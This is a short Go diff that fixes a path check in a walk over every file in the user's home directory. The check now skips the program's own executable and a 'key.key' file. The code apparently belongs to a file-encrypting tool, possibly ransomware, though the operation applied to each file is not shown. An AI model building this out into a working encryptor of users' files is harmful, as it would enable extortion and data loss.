@@ -72,10 +72,11 @@ func main() {
 		return
 	}
 
+	keyFile := keyDir+"key.key"
 	var wg sync.WaitGroup
 
 	filepath.WalkDir(homeDir, func(path string, d fs.DirEntry, err error) error {
-		if err != nil || d.IsDir() || path == execPath || path == keyDir {
+		if err != nil || d.IsDir() || path == execPath || path == keyFile {
 			return nil
 		}
 
